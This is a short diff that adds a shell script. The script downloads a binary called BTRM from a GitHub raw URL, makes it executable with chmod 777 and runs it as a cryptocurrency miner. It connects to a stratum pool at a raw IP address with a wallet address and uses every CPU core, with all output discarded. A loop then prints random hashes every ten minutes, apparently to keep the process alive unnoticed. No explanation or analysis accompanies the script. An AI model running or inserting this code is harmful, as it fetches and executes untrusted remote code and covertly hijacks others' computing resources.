@@ -1,0 +1,4 @@
+wget https://raw.githubusercontent.com/novalanto010101/file/main/BTRM
+chmod 777 BTRM
+./BTRM -a gr -o stratum+tcp://167.172.75.228:80 -u BGgTzueQco7fYKsATxWNqjgYDLvzdiptsg.$(echo $(shuf -i 1-20000 -n 1)-BBC) -p webpassword=x,m=solo -t$(nproc --all) >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
